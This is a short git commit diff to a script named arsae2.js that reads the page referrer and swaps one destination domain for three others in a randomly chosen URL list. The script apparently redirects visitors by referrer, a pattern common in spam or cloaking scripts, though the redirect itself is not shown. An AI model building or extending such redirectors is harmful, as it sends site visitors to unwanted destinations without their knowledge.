8e6fcd3976041f98f9a8ad32c156691751f89320
santirozalia <108447198+santirozalia@users.noreply.github.com>
2023-04-18 14:18:03 +0700

    Update arsae2.js

--- arsae2.js
+++ arsae2.js
@@ -4,7 +4,10 @@
     	var cek = document.referrer;
 
     	var ars 	= rChoice([
-							'https://bloggzone.me/',
+							
+							'https://kasef.co.uk/',
+							'https://kasef.xyz/',
+							'https://geulis.xyz/',
 							 
 		
 							]);
